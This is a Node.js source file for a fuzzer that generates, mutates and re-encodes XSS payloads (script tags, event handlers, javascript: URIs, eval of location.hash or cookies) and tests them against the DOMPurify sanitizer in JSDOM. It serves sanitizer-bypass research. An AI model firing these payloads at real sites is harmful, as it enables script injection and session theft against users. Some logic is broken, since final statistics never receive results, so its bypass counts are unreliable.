const { Buffer } = require('buffer');
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const os = require('os');
const Iconv = require('iconv-lite');
const crypto = require('crypto');
const fs = require('fs');
const readline = require('readline');
const path = require('path');

// Configuration object
const config = {
  maxPayloads: 1000,
  encodings: getSupportedEncodings([
    'UTF-8', 'UTF-16LE', 'UTF-16BE', 'UTF-7',
    'ISO-8859-1', 'ISO-8859-2', 'ISO-8859-3', 'ISO-8859-4', 'ISO-8859-5',
    'ISO-8859-6', 'ISO-8859-7', 'ISO-8859-8', 'ISO-8859-9', 'ISO-8859-10',
    'ISO-8859-13', 'ISO-8859-14', 'ISO-8859-15', 'ISO-8859-16',
    'windows-1250', 'windows-1251', 'windows-1252', 'windows-1253', 'windows-1254',
    'windows-1255', 'windows-1256', 'windows-1257', 'windows-1258',
    'KOI8-R', 'KOI8-U', 'ASCII', 'ISO-2022-JP', 'ISO-2022-KR', 'ISO-2022-CN',
    'GB18030', 'Big5', 'EUC-JP', 'Shift_JIS', 'base64'
  ]),
  mlPayloadCount: 20,
  maxPayloadLength: 100,
  reportFile: 'xss_fuzzer_report.json',
  maxWorkers: 4,
  batchSize: 100
};

function safelyAccessLength(obj) {
  return obj && Array.isArray(obj) ? obj.length : 0;
}

function getSupportedEncodings(encodings) {
  return encodings.filter(encoding => {
    if (encoding === 'ISO-2022-JP' || encoding === 'base64') {
      return true;
    }
    try {
      Iconv.encode('test', encoding);
      return true;
    } catch (error) {
      console.warn(`Encoding not supported and will be skipped: ${encoding}`);
      return false;
    }
  });
}

class MarkovChain {
  constructor() {
    this.chain = new Map();
  }

  addSequence(sequence) {
    for (let i = 0; i < sequence.length - 1; i++) {
      const current = sequence[i];
      const next = sequence[i + 1];
      if (!this.chain.has(current)) {
        this.chain.set(current, new Map());
      }
      const nextMap = this.chain.get(current);
      nextMap.set(next, (nextMap.get(next) || 0) + 1);
    }
  }

  generate(length) {
    if (this.chain.size === 0) return '';
    let current = Array.from(this.chain.keys())[Math.floor(Math.random() * this.chain.size)];
    let result = current;
    for (let i = 1; i < length; i++) {
      if (!this.chain.has(current)) {
        break;
      }
      const nextMap = this.chain.get(current);
      const nextChars = Array.from(nextMap.keys());
      const nextWeights = Array.from(nextMap.values());
      const totalWeight = nextWeights.reduce((sum, weight) => sum + weight, 0);
      let random = Math.random() * totalWeight;
      let nextIndex = 0;
      while (random > 0) {
        random -= nextWeights[nextIndex];
        nextIndex++;
      }
      nextIndex--;
      const next = nextChars[nextIndex];
      result += next;
      current = next;
    }
    return result;
  }
}

class EnhancedMarkovChain {
  constructor() {
    this.unigramChain = new Map();
    this.bigramChain = new Map();
    this.trigramChain = new Map();
  }

  addSequence(sequence) {
    if (typeof sequence !== 'string' || sequence.length === 0) {
      console.warn("Invalid sequence provided to addSequence");
      return;
    }

    for (let i = 0; i < sequence.length; i++) {
      // Unigram
      const char = sequence[i];
      this.unigramChain.set(char, (this.unigramChain.get(char) || 0) + 1);

      // Bigram
      if (i < sequence.length - 1) {
        const bigram = sequence.slice(i, i + 2);
        if (!this.bigramChain.has(bigram)) {
          this.bigramChain.set(bigram, new Map());
        }
        const nextChar = sequence[i + 2] || null;
        const nextMap = this.bigramChain.get(bigram);
        nextMap.set(nextChar, (nextMap.get(nextChar) || 0) + 1);
      }

      // Trigram
      if (i < sequence.length - 2) {
        const trigram = sequence.slice(i, i + 3);
        if (!this.trigramChain.has(trigram)) {
          this.trigramChain.set(trigram, new Map());
        }
        const nextChar = sequence[i + 3] || null;
        const nextMap = this.trigramChain.get(trigram);
        nextMap.set(nextChar, (nextMap.get(nextChar) || 0) + 1);
      }
    }
  }

  generate(length) {
    if (this.trigramChain.size === 0) {
      console.warn("Markov chain is empty. Unable to generate sequence.");
      return '';
    }

    let result = this.getRandomStart();
    while (result.length < length) {
      const next = this.getNextChar(result);
      if (next === null) break;
      result += next;
    }
    return result;
  }

  getRandomStart() {
    const starts = Array.from(this.trigramChain.keys());
    return starts[Math.floor(Math.random() * starts.length)];
  }

  getNextChar(sequence) {
    if (sequence.length >= 3) {
      const trigram = sequence.slice(-3);
      if (this.trigramChain.has(trigram)) {
        return this.weightedRandomChoice(this.trigramChain.get(trigram));
      }
    }

    if (sequence.length >= 2) {
      const bigram = sequence.slice(-2);
      if (this.bigramChain.has(bigram)) {
        return this.weightedRandomChoice(this.bigramChain.get(bigram));
      }
    }

    return this.weightedRandomChoice(this.unigramChain);
  }

  weightedRandomChoice(weightMap) {
    if (!weightMap || weightMap.size === 0) return null;

    const total = Array.from(weightMap.values()).reduce((sum, weight) => sum + weight, 0);
    let random = Math.random() * total;
    for (const [item, weight] of weightMap.entries()) {
      random -= weight;
      if (random <= 0) return item;
    }
    return null;
  }
}

class GeneticAlgorithm {
  constructor() {
    this.population = [];
    this.mutationRate = 0.1;
  }

  addToPopulation(payload) {
    if (payload && typeof payload === 'string' && !this.population.includes(payload)) {
      this.population.push(payload);
    }
  }

  mutate(payload) {
    if (!payload || typeof payload !== 'string') return '';
    return payload.split('').map(char =>
      Math.random() < this.mutationRate ? String.fromCharCode(char.charCodeAt(0) ^ 1) : char
    ).join('');
  }

  crossover(parent1, parent2) {
    if (!parent1 || !parent2 || typeof parent1 !== 'string' || typeof parent2 !== 'string') {
      return '';
    }
    const crossoverPoint = Math.floor(Math.random() * Math.min(parent1.length, parent2.length));
    return parent1.slice(0, crossoverPoint) + parent2.slice(crossoverPoint);
  }

  evolvePayloads(successfulPatterns, count) {
    // Add successful patterns to the population
    successfulPatterns.forEach(pattern => this.addToPopulation(pattern));

    // If population is empty or has only one element, return empty array
    if (this.population.length <= 1) {
      console.warn("Insufficient population for evolution. Returning empty array.");
      return [];
    }

    let evolved = [];
    for (let i = 0; i < count; i++) {
      const parent1 = this.population[Math.floor(Math.random() * this.population.length)];
      const parent2 = this.population[Math.floor(Math.random() * this.population.length)];
      let child = this.crossover(parent1, parent2);
      child = this.mutate(child);
      if (child) {
        evolved.push(child);
      }
    }
    return evolved;
  }
}

class PayloadGenerator {
  constructor() {
    this.successfulPatterns = new Set();
    this.memoizedPayloads = new Map();
    this.browserSpecificPayloads = this.generateBrowserSpecificPayloads();
    this.markovChain = new MarkovChain();
    this.enhancedMarkovChain = new EnhancedMarkovChain();
    this.uniquePayloads = new Set();
    this.geneticAlgorithm = new GeneticAlgorithm();

    // Initialize with seed data
    this.initializeSeedData();
  }

  initializeSeedData() {
    const seedPayloads = this.generateBasePayloads();
    seedPayloads.forEach(payload => {
      this.markovChain.addSequence(payload);
      this.enhancedMarkovChain.addSequence(payload);
      this.geneticAlgorithm.addToPopulation(payload);
    });
  }

  generateBasePayloads() {
    return [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert(1)>',
      '<svg><script>alert(1)</script></svg>',
      '<iframe src="javascript:alert(1)"></iframe>',
      '<a href="javascript:alert(1)">Click me</a>',
      '<div onmouseover="alert(1)">Hover me</div>',
      '<input type="text" onfocus="alert(1)" autofocus>',
      '<details open ontoggle="alert(1)">',
      '<audio src=x onerror=alert(1)>',
      '<video src=x onerror=alert(1)>',
      '<body onload=alert(1)>',
      '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
      '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
      '<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">click',
      '<table background="javascript:alert(1)"></table>',
      '"><script>alert(1)</script>',
      '<!-- <img src=x onerror=alert(1)> -->',
      '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
      '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
      '<?xml version="1.0"?><html><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script></html>'
    ];
  }

  generateBrowserSpecificPayloads() {
    return {
      chrome: [
        '<script>({[]})</script>',
        '<svg><script>alert&#40;1)</script>',
        '<svg><script>alert&#x28;1&#x29;</script>'
      ],
      firefox: [
        '<svg xmlns="#"><script>alert(1)</script></svg>',
        '<svg><style>{font-family:\'<script>alert(1)</script>\';}</style></svg>'
      ],
      safari: [
        '<svg><script>alert&lpar;1&rpar;</script>',
        '<svg><script>alert&#x28;1&#x29;</script>'
      ],
      edge: [
        '<x onclick=alert(1)>click this!',
        '<svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">Click me</text></a></svg>'
      ]
    };
  }

  generateDOMBasedPayloads() {
    return [
      '"><script>eval(location.hash.slice(1))</script>',
      '<img src=x onerror=eval(atob(this.id))>',
      '<svg><script>eval(location.search.slice(1))</script>',
      '<iframe src="javascript:eval(name)"></iframe>',
      '<script>eval(document.cookie)</script>'
    ];
  }

  generateMLPayloads(count = config.mlPayloadCount, maxLength = config.maxPayloadLength) {
    const payloads = [];
    for (let i = 0; i < count; i++) {
      let payload = this.enhancedMarkovChain.generate(maxLength);
      if (payload && payload.length > 0) {
        if (!payload.includes('<') || !payload.includes('>')) {
          payload = `<${payload}>`;
        }
        if (this.isUniquePayload(payload)) {
          payloads.push(payload);
        }
      } else {
        console.warn("Generated an empty payload, using a base payload instead.");
        payload = this.generateBasePayloads()[Math.floor(Math.random() * this.generateBasePayloads().length)];
        payloads.push(payload);
      }
    }
    return payloads;
  }

  isUniquePayload(payload) {
    const hash = crypto.createHash('sha256').update(payload).digest('hex');
    if (this.uniquePayloads.has(hash)) {
      return false;
    }
    this.uniquePayloads.add(hash);
    return true;
  }

  *generateDynamicPayloads() {
    const basePayloads = this.generateBasePayloads();
    const domBasedPayloads = this.generateDOMBasedPayloads();
    const browserPayloads = Object.values(this.browserSpecificPayloads).flat();
    const mlPayloads = this.generateMLPayloads();
    const geneticPayloads = this.geneticAlgorithm.evolvePayloads(this.successfulPatterns, 20);

    const allPayloads = [...basePayloads, ...domBasedPayloads, ...browserPayloads, ...mlPayloads, ...geneticPayloads];

    for (const payload of allPayloads) {
      if (this.isUniquePayload(payload)) {
        yield payload;
      }
    }

    for (const pattern of this.successfulPatterns) {
      const variants = [
        pattern.replace('alert(1)', 'alert(2)'),
        pattern.replace('XSS', 'XSS2'),
        this.mutateSuccessfulPattern(pattern)
      ];
      for (const variant of variants) {
        if (this.isUniquePayload(variant)) {
          yield variant;
        }
      }
    }
  }

  mutateSuccessfulPattern(pattern) {
    const mutations = [
      p => p.replace('alert', 'confirm'),
      p => p.replace('1', 'document.domain'),
      p => p.replace('>', ' id=x>'),
      p => p.replace('script', 'scrscriptipt'),
      p => p.replace('on', 'oonn'),
      p => p.split('').reverse().join(''),
      p => this.markovChain.generate(p.length),
      p => this.geneticAlgorithm.mutate(p),
    ];
    return mutations[Math.floor(Math.random() * mutations.length)](pattern);
  }

  addSuccessfulPattern(payload) {
    this.successfulPatterns.add(payload);
    this.markovChain.addSequence(payload);
    this.enhancedMarkovChain.addSequence(payload);
    this.geneticAlgorithm.addToPopulation(payload);
  }
}

const contextAwareMutate = (payload, context = 'html') => {
  const contextMutations = {
    'html': [
      p => p.replace(/</g, '&lt;'),
      p => p.replace(/>/g, '&gt;'),
      p => p.replace(/"/g, '&quot;'),
      p => p.replace(/'/g, '&#39;'),
      p => `<!--${p}-->`,
      p => `<![CDATA[${p}]]>`,
    ],
    'attribute': [
      p => p.replace(/"/g, '&quot;'),
      p => p.replace(/'/g, '&#39;'),
      p => encodeURIComponent(p),
      p => p.replace(/\s/g, '&#x20;'),
      p => p.split('').map(c => `&#x${c.charCodeAt(0).toString(16)};`).join(''),
    ],
    'js': [
      p => p.replace(/'/g, '\\\''),
      p => p.replace(/"/g, '\\"'),
      p => `eval(atob('${btoa(p)}'))`,
      p => `String.fromCharCode(${p.split('').map(c => c.charCodeAt(0)).join(',')})`,
      p => `[${p.split('').map(c => `'${c}'`).join(',')}].join('')`,
    ],
    'url': [
      p => encodeURIComponent(p),
      p => p.split('').map(c => `%${c.charCodeAt(0).toString(16)}`).join(''),
      p => btoa(p),
      p => p.replace(/\s/g, '+'),
    ],
    'css': [
      p => p.replace(/'/g, '\\"'),
      p => p.split('').map(c => `\\${c.charCodeAt(0).toString(16)} `).join(''),
      p => `eval(atob('${btoa(p)}'))`,
    ],
  };

  const generalMutations = [
    p => p.toUpperCase(),
    p => p.toLowerCase(),
    p => p.split('').map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join(''),
    p => p.split('').reverse().join(''),
    p => p.replace(/\s/g, String.fromCharCode(0)),
    p => p.replace(/[aeiou]/g, char => `&#x${char.charCodeAt(0).toString(16)};`),
  ];

  const mutations = [...generalMutations, ...(contextMutations[context] || [])];
  return mutations.map(mutate => mutate(payload));
};

const memoizedInsertions = new Map();

function insertEscapeSequence(payload, sequence) {
  const memoKey = `${payload}|${sequence}`;
  if (memoizedInsertions.has(memoKey)) {
    return memoizedInsertions.get(memoKey);
  }

  const insertionPoints = [
    { index: 0, variant: sequence + payload },
    { index: payload.length, variant: payload + sequence },
    { index: payload.indexOf('>'), variant: payload.replace('>', sequence + '>') },
    { index: payload.indexOf('"'), variant: payload.replace('"', sequence + '"') },
    { index: payload.indexOf('='), variant: payload.replace('=', sequence + '=') },
    { index: payload.indexOf('<'), variant: payload.replace('<', sequence + '<') },
    { index: payload.indexOf('javascript:'), variant: payload.replace('javascript:', 'javascript:' + sequence) }
  ];

  const result = insertionPoints
    .filter(point => point.index !== -1)
    .map(point => point.variant);

  memoizedInsertions.set(memoKey, result);
  return result;
}

const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

function testDOMPurify(payload, config = {}) {
  return DOMPurify.sanitize(payload, config);
}

function categorizeBypass(original, cleaned) {
  if (cleaned.includes('<script')) return 'Script Injection';
  if (cleaned.includes('javascript:')) return 'JavaScript Protocol';
  if (cleaned.includes('on') && /on\w+=/i.test(cleaned)) return 'Event Handler';
  if (cleaned.includes('<') && cleaned.includes('>')) return 'HTML Injection';
  if (cleaned.includes('data:')) return 'Data URI';
  if (cleaned.includes('eval(')) return 'DOM-based XSS';
  if (cleaned !== original) return 'Partial Bypass';
  return 'Unknown';
}

function basicISO2022JPEncode(str) {
  const ascii = Buffer.from('\x1B(B').toString('binary');
  const jis = Buffer.from('\x1B$B').toString('binary');
  const escapeSequence = Buffer.from('\xb1(J').toString('binary');
  let result = ascii;
  for (let i = 0; i < str.length; i++) {
    const charCode = str.charCodeAt(i);
    if (charCode > 127) {
      result += jis + str[i] + ascii;
    } else {
      result += str[i];
    }
    // Randomly insert the escape sequence
    if (Math.random() < 0.1) {  // 10% chance to insert the escape sequence
      result += escapeSequence;
    }
  }
  return result;
}

function encodeWithFallback(payload, encoding) {
  if (encoding === 'ISO-2022-JP') {
    return basicISO2022JPEncode(payload);
  } else if (encoding === 'base64') {
    return Buffer.from(payload).toString('base64');
  } else if (encoding === 'ISO-2022-JP-ESCAPED') {
    // This is a new encoding option that always includes the escape sequence
    return basicISO2022JPEncode(payload) + Buffer.from('\xb1(J').toString('binary');
  } else {
    return Iconv.encode(Iconv.decode(Buffer.from(payload), 'utf8'), encoding).toString('binary');
  }
}

config.encodings.push('ISO-2022-JP-ESCAPED');

const dangerousEscapeSequences = [
  '\xb1(J',  // ISO-2022-JP escape
  '\x1B',    // ASCII escape
  '\u001B',  // Unicode escape
  '\e',      // Another representation of escape
  '\\',      // Backslash (for escaping in various contexts)
  '%',       // URL encoding escape
  '&',       // HTML entity escape
  '&#',      // HTML decimal escape
  '&#x',     // HTML hexadecimal escape
];

function fuzzyEncode(payload, encoding) {
  let encodedPayload = encodeWithFallback(payload, encoding);

  // Randomly insert dangerous escape sequences
  dangerousEscapeSequences.forEach(seq => {
    if (Math.random() < 0.1) {  // 10% chance to insert each sequence
      const insertPosition = Math.floor(Math.random() * encodedPayload.length);
      encodedPayload = encodedPayload.slice(0, insertPosition) + seq + encodedPayload.slice(insertPosition);
    }
  });

  return encodedPayload;
}

function* fuzzEncodings(payload) {
  if (!/[<>'"&]/.test(payload)) {
    return;
  }

  for (const encoding of config.encodings) {
    try {
      if (encoding !== 'ISO-2022-JP' && encoding !== 'base64' && !Iconv.encodingExists(encoding)) {
        console.warn(`Encoding not supported: ${encoding}`);
        continue;
      }

      const encodedPayload = fuzzyEncode(payload, encoding);
      const cleanedPayload = testDOMPurify(encodedPayload);

      if (cleanedPayload !== encodedPayload) {
        const cleanedAllowedScripts = testDOMPurify(encodedPayload, { ALLOW_SCRIPT: true });
        yield {
          encoding,
          original: payload,
          encoded: encodedPayload,
          cleanedDefault: cleanedPayload,
          cleanedAllowScript: cleanedAllowedScripts,
          category: categorizeBypass(encodedPayload, cleanedPayload)
        };
      }

      // Additional test with concatenated escape sequences
      const concatenatedEscapes = dangerousEscapeSequences.join('');
      const encodedPayloadWithEscapes = fuzzyEncode(payload + concatenatedEscapes, encoding);
      const cleanedPayloadWithEscapes = testDOMPurify(encodedPayloadWithEscapes);

      if (cleanedPayloadWithEscapes !== encodedPayloadWithEscapes) {
        const cleanedAllowedScriptsWithEscapes = testDOMPurify(encodedPayloadWithEscapes, { ALLOW_SCRIPT: true });
        yield {
          encoding,
          original: payload + concatenatedEscapes,
          encoded: encodedPayloadWithEscapes,
          cleanedDefault: cleanedPayloadWithEscapes,
          cleanedAllowScript: cleanedAllowedScriptsWithEscapes,
          category: categorizeBypass(encodedPayloadWithEscapes, cleanedPayloadWithEscapes)
        };
      }
    } catch (error) {
      console.error(`Error with encoding ${encoding}: ${error.message}`);
    }
  }
}

const escapeSequences = Array.from({ length: 256 }, (_, i) => `\\x${i.toString(16).padStart(2, '0')}`);

class AsyncQueue {
  constructor() {
    this.queue = [];
    this.waitingResolvers = [];
  }

  push(item) {
    if (this.waitingResolvers.length > 0) {
      const resolve = this.waitingResolvers.shift();
      resolve(item);
    } else {
      this.queue.push(item);
    }
  }

  async pop() {
    if (this.queue.length > 0) {
      return this.queue.shift();
    } else {
      return new Promise(resolve => {
        this.waitingResolvers.push(resolve);
      });
    }
  }
}

function processResults(results, payloadGenerator) {
  console.log(`Processing ${results.length} total results...`);

  if (!Array.isArray(results) || results.length === 0) {
    console.log("No results to process.");
    return;
  }

  const byCategory = results.reduce((acc, result) => {
    acc[result.category] = (acc[result.category] || 0) + 1;
    return acc;
  }, {});

  const byEncoding = results.reduce((acc, result) => {
    acc[result.encoding] = (acc[result.encoding] || 0) + 1;
    return acc;
  }, {});

  console.log("\nFuzzing complete. Summary of results:");
  console.log(`Total potential bypasses found: ${results.length}`);

  console.log("\nBypasses by category:");
  Object.entries(byCategory)
    .sort((a, b) => b[1] - a[1])
    .forEach(([category, count]) => {
      console.log(`${category}: ${count}`);
    });

  console.log("\nTop encodings with potential bypasses:");
  Object.entries(byEncoding)
    .sort((a, b) => b[1] - a[1])
    .slice(0, 5)
    .forEach(([encoding, count]) => {
      console.log(`${encoding}: ${count}`);
    });

  // Add successful patterns to the payload generator for future use
  results.forEach(result => {
    payloadGenerator.addSuccessfulPattern(result.original);
  });

  // Write full report to file
  const reportData = {
    summary: {
      totalBypasses: results.length,
      byCategory,
      topEncodings: Object.fromEntries(Object.entries(byEncoding).sort((a, b) => b[1] - a[1]).slice(0, 5)),
    },
    detailedResults: results,
  };

  fs.writeFileSync(config.reportFile, JSON.stringify(reportData, null, 2));
  console.log(`\nFull report written to ${config.reportFile}`);
}

function loadConfig(configPath) {
  try {
    const userConfig = require(configPath);
    return { ...config, ...userConfig };
  } catch (error) {
    console.warn(`Failed to load config from ${configPath}. Using default config.`);
    return config;
  }
}

async function runFuzzer(configPath) {
  console.log("Starting runFuzzer function...");

  console.log("Loading configuration...");
  const runConfig = loadConfig(configPath);
  console.log("Configuration loaded successfully.");

  console.log("Starting XSS fuzzer with the following configuration:");
  console.log(JSON.stringify(runConfig, null, 2));

  console.log("Initializing PayloadGenerator...");
  const payloadGenerator = new PayloadGenerator();
  console.log("PayloadGenerator initialized.");

  const numCPUs = Math.min(os.cpus().length, runConfig.maxWorkers);
  console.log(`Using ${numCPUs} worker threads`);

  const workQueue = new AsyncQueue();
  console.log("Work queue initialized");

  const results = [];
  let activeWorkers = 0;
  let totalProcessedPayloads = 0;
  let lastProcessedCount = 0;
  let stuckCounter = 0;

  console.log("Starting to generate payloads...");
  let payloadCount = 0;
  for (const payload of payloadGenerator.generateDynamicPayloads()) {
    if (payload) {
      workQueue.push(payload);
      payloadCount++;
      if (payloadCount % 100 === 0) {
        console.log(`Generated ${payloadCount} payloads so far...`);
      }
    }
  }
  console.log(`Total payloads generated: ${payloadCount}`);

  if (payloadCount === 0) {
    console.error("No payloads were generated. Exiting...");
    return;
  }

  const resultsStream = fs.createWriteStream(runConfig.reportFile, { flags: 'a' });

  function createWorker() {
    console.log("Creating new worker...");
    const worker = new Worker(__filename, {
      workerData: { config: runConfig }
    });
    activeWorkers++;
    console.log(`Active workers: ${activeWorkers}`);

    worker.on('message', (message) => {
      if (message && message.type === 'result' && Array.isArray(message.data)) {
        message.data.forEach(result => {
          resultsStream.write(JSON.stringify(result) + '\n');
        });
        totalProcessedPayloads += message.data.length;
        console.log(`Processed ${message.data.length} results. Total processed: ${totalProcessedPayloads}`);
      } else if (message && message.type === 'ready') {
        console.log("Worker ready, sending next payload...");
        workQueue.pop().then(payload => {
          if (payload) {
            worker.postMessage({ type: 'payload', data: payload });
          } else {
            console.log("No more payloads, terminating worker...");
            worker.terminate();
          }
        });
      }
    });

    worker.on('error', (error) => {
      console.error(`Worker error: ${error.message}`);
    });

    worker.on('exit', (code) => {
      activeWorkers--;
      console.log(`Worker exited with code ${code}. Active workers: ${activeWorkers}`);
      if (code !== 0) {
        console.error(`Worker stopped with exit code ${code}`);
      }
      if (activeWorkers === 0) {
        console.log('All workers completed. Processing final results...');
        resultsStream.end();
        presentFinalStats(results, payloadCount, totalProcessedPayloads);
        process.exit(0);
      }
    });

    return worker;
  }

  // Create initial set of workers
  console.log("Creating initial set of workers...");
  for (let i = 0; i < numCPUs; i++) {
    createWorker();
  }
  console.log("Initial workers created, waiting for completion...");

  // Implement a timeout and progress checking
  const timeout = setInterval(() => {
    console.log(`Progress: ${totalProcessedPayloads}/${payloadCount} payloads processed`);
    if (totalProcessedPayloads === lastProcessedCount) {
      stuckCounter++;
      console.warn(`No progress made in the last ${stuckCounter} check(s)`);
      if (stuckCounter >= 5) {
        console.error("Fuzzer appears to be stuck. Forcing termination...");
        process.exit(1);
      }
    } else {
      stuckCounter = 0;
      lastProcessedCount = totalProcessedPayloads;
    }

    if (totalProcessedPayloads >= payloadCount) {
      clearInterval(timeout);
      console.log("All payloads processed. Waiting for workers to complete...");
    }
  }, 60000); // Check progress every minute

  // Wait for all workers to complete
  while (activeWorkers > 0) {
    await new Promise(resolve => setTimeout(resolve, 1000));
    console.log(`Waiting for workers to complete. Active workers: ${activeWorkers}`);
  }

  clearInterval(timeout);
  console.log("Fuzzing completed successfully.");
}

function presentFinalStats(results, totalPayloads, processedPayloads) {
  console.log("\n--- Final Fuzzing Statistics ---");
  console.log(`Total payloads generated: ${totalPayloads}`);
  console.log(`Total payloads processed: ${processedPayloads}`);
  console.log(`Total results: ${results.length}`);

  const byCategory = results.reduce((acc, result) => {
    acc[result.category] = (acc[result.category] || 0) + 1;
    return acc;
  }, {});

  console.log("\nResults by category:");
  Object.entries(byCategory)
    .sort((a, b) => b[1] - a[1])
    .forEach(([category, count]) => {
      console.log(`${category}: ${count}`);
    });

  const byEncoding = results.reduce((acc, result) => {
    acc[result.encoding] = (acc[result.encoding] || 0) + 1;
    return acc;
  }, {});

  console.log("\nTop 5 encodings with potential bypasses:");
  Object.entries(byEncoding)
    .sort((a, b) => b[1] - a[1])
    .slice(0, 5)
    .forEach(([encoding, count]) => {
      console.log(`${encoding}: ${count}`);
    });

  console.log(`\nFull report written to ${config.reportFile}`);
  console.log("--- End of Fuzzing Statistics ---");
}

if (!isMainThread) {
  console.log("Worker thread starting...");
  const { config: workerConfig } = workerData || {};

  function processPayload(payload) {
    if (!payload) {
      console.log("Received empty payload, skipping...");
      return;
    }
    console.log(`Processing payload: ${payload.substring(0, 50)}...`);
    const results = [];
    for (const context of ['html', 'attribute', 'js', 'url', 'css']) {
      console.log(`Mutating payload for context: ${context}`);
      const mutatedPayloads = contextAwareMutate(payload, context);
      for (const mutatedPayload of mutatedPayloads) {
        if (mutatedPayload) {
          console.log(`Fuzzing encodings for mutated payload: ${mutatedPayload.substring(0, 50)}...`);
          for (const result of fuzzEncodings(mutatedPayload)) {
            if (result) {
              results.push(result);
              if (results.length >= workerConfig.batchSize) {
                console.log(`Sending batch of ${results.length} results`);
                parentPort.postMessage({ type: 'result', data: results });
                results.length = 0;  // Clear the results array
              }
            }
          }
        }
      }
    }
    if (results.length > 0) {
      console.log(`Sending final batch of ${results.length} results`);
      parentPort.postMessage({ type: 'result', data: results });
    }
    console.log("Payload processing completed.");
  }

  parentPort.on('message', (message) => {
    if (message && message.type === 'payload' && message.data) {
      console.log("Received payload from main thread, processing...");
      processPayload(message.data);
      console.log("Payload processed, sending ready message...");
      parentPort.postMessage({ type: 'ready' });
    }
  });

  console.log("Worker initialized, sending ready message...");
  parentPort.postMessage({ type: 'ready' });
}

async function main() {
  try {
    console.log("Starting main function...");

    console.log("Checking supported encodings...");
    const supportedEncodings = getSupportedEncodings(config.encodings);
    console.log("Supported encodings:", supportedEncodings);

    console.log("Loading configuration...");
    const configPath = process.argv[2] || './fuzzer-config.json';
    console.log(`Using config path: ${configPath}`);

    console.log("Initializing fuzzer...");
    await runFuzzer(configPath);

    console.log("Fuzzer execution completed successfully.");
  } catch (error) {
    console.error("An error occurred during fuzzer execution:");
    console.error(error);
    if (error.stack) {
      console.error("Stack trace:");
      console.error(error.stack);
    }
  }
}

if (require.main === module) {
  console.log("Script running as main module");
  main().catch(error => {
    console.error(`Unexpected error in main function: ${error.message}`);
    console.error(error.stack);
    process.exit(1);
  });
} else {
  console.log("Script loaded as a module");
}

process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

process.on('uncaughtException', (error) => {
  console.error('Uncaught Exception:', error);
});